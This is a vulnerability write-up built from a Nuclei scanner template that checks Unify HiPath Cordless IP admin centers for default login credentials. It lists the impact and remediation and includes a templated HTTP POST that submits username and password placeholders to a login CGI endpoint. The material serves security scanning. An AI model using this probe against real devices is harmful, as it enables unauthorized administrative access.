# Nuclei Template: Unify HiPath Cordless IP - Default Login
**Template ID:** unify-hipath-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`unify-hipath-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Default login credentials on the Unify HiPath Cordless IP admin center were discovered.

## Impact
An attacker could gain unauthorized access to the admin center and potentially change the configuration of the devices configured on the service.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}
POST /cgi-bin/ikon_button.exe?page=1500&button=51&line=0&eventid=0&WbmSessionId=nosession&Username={{user}}&Password={{pass}}&CountryCode=en&NoSessionTimeout=false&SwitchLanguage=false HTTP/1.1
Host: {{Hostname}}
```

## Remediation
Change the default password to a strong password.

## References
- https://wiki.unify.com/images/d/dd/HiPath_Cordless_IP_V1,_Administrator_Documentation.pdf
